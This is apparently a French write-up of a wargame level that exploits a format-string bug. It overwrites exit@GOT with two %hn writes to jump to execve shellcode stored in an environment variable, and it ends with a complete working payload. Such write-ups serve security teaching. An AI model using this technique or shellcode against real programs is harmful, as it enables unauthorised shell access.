# level05 : format string + écrasement de la GOT

```c
int main(int argc, char **argv, char **envp)
{
    char var_78[100];

    fgets(var_78, 100, stdin);

    for (int i = 0; i < strlen(var_78); i++) {
        if (var_78[i] > 64 && var_78[i] <= 90)
            var_78[i] ^= 32;
    }

    printf(var_78);
    exit(0);
}
```

`printf(var_78)` sans format -> format string. pas de system ici : on ecrase `exit@GOT` pour qu'il saute sur un shellcode place dans une variable d'env.

adresse de exit dans la GOT :

    objdump -R level05 | grep exit
    080497e0 R_386_JUMP_SLOT   exit

trouver l'offset de notre input sur la stack avec des %p :

    %p %p %p %p %p %p %p %p %p %p %p ...
    0x64 0xf7fcfac0 0xf7ec3add 0xffffd5ff 0xffffd5fe (nil) 0xffffffff 0xffffd684 0xf7fdb000 0x25207025 ...
    offset 10: 0xffffd5f4
    offset 11: 0xffffd5f8

shellcode (NOP sled + execve) dans une variable d'env, puis recuperer son adresse :

    export shellcode=$(python2 -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

    (gdb) x/s *(environ+48)
    0xffffde36:  "shellcode=\220\220\220\220..."

    -> on vise le milieu du sled : 0xffffdea4

on ne peut pas printf ~4 milliards de caracteres pour ecrire 0xffffdea4 d'un coup -> 2 ecritures de 2 octets (%hn) :

    exit@GOT      = 0x080497e0  (moitie basse)  -> \xe0\x97\x04\x08
    exit@GOT + 2  = 0x080497e2  (moitie haute)  -> \xe2\x97\x04\x08

    1) compteur = 0xdea4 = 57012 : 8 octets deja ecrits -> %57004c puis %10$hn
    2) compteur = 0xffff = 65535 : deja a 57012          -> %8523c  puis %11$hn

payload :

    (python2 -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%57004c%10$hn%8523c%11$hn"'; cat) | ./level05
